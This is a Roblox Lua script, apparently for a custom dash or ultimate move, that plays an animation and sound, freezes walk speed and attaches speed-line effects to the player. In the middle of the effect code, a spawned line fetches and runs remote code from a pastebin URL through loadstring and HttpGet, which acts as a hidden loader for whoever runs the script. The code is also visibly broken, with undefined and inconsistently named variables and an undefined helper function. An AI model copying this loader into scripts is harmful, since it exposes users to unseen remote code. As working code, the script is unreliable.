local TweenS = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local speed = 100
local humanoid = Character:WaitForChild("Humanoid")
local move = Instance.new("BodyVelocity", RootPart)
move.MaxForce = Vector3.new(math.huge, 0, math.huge)

local hittedlist = {}

local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://17354976067"
local Anim = Humanoid:LoadAnimation(Anim)
Anim.Animation = "rbxassetid://0"
Anim:Play()
humanoid.WalkSpeed = 0

local sound = Instance.new("Sound")
sound.SoundId = "rbxassetid://17429233290"
sound.Volume = 1
sound.Pitch = 1.0
sound.PlaybackSpeed = 1.0

sound:Play()

local function setWalkSpeedToZero()
 local humanoid = character:WaitForChild("Humanoid")
 humanoid.WalkSpeed = 0
end

if character then
 setWalkSpeedToZero()
end

player.CharacterAdded:Connect(function(newCharacter)
  character = newCharacter
  setWalkSpeedToZero()
end)

spawn(function()
  loadstring(game:HttpGet("https://pastebin.pl/view/raw/73e409e5"))()
end)

local ResourcesFolder = ReplicatedStorage:WaitForChild("Resources")

local KJEffectsFolder = ResourcesFolder:WaitForChild("KJEffects")

local speedlinesandstuffPart = KJEffectsFolder:WaitForChild("speedlinesandstuff")

local speedlinesandstuffClone = speedlinesandstuffPart:Clone()
speedlinesandstuffClone.Parent = ReplicatedStorage

local offset = Vector3.new(0, 0, -9)

local function updateSpeedlinesPosition()
 while true do
  speedlinesandstuffClone.CFrame = rootPart.CFrame * CFrame.new(offset)
  wait(0.1)
 end
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

        local function waitForPart()
            local speedlinesandstuff = ReplicatedStorage:WaitForChild("Resources"):WaitForChild("KJEffects"):WaitForChild("speedlinesandstuff")
            local thespeedthingunderultik = findPartByName(speedlinesandstuff, "thespeedthingunderultik")
            if thespeedthingunderultik then
                -- Clone the part into Workspace and make it follow the player
                local clonedPart = thespeedthingunderultik:Clone()
                clonedPart.Parent = Workspace
                
                -- Function to make the cloned part follow the player
                local function followPlayer()
                    local player = game.Players.LocalPlayer
                    local character = player.Character
                    if character then
                        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                        local humanoid = character:FindFirstChildOfClass("Humanoid")
                        if humanoidRootPart and humanoid then
                            local torso = humanoidRootPart:FindFirstChild("LowerTorso")
                            if torso then
                                clonedPart.CFrame = torso.CFrame
                                clonedPart.CFrame = clonedPart.CFrame * CFrame.new(0, -humanoid.HipHeight / 2, 0) -- Offset under the legs
                                clonedPart.CFrame = clonedPart.CFrame * CFrame.Angles(0, math.rad(180), 0) -- Make it look where the character looks
                            end
                        end
                    end
                end
                
                -- Run the followPlayer function every frame
                game:GetService("RunService").RenderStepped:Connect(followPlayer)
        end
   end
        
        -- Call the waitForPart function
        waitForPart()

spawn(updateSpeedlinesPosition)
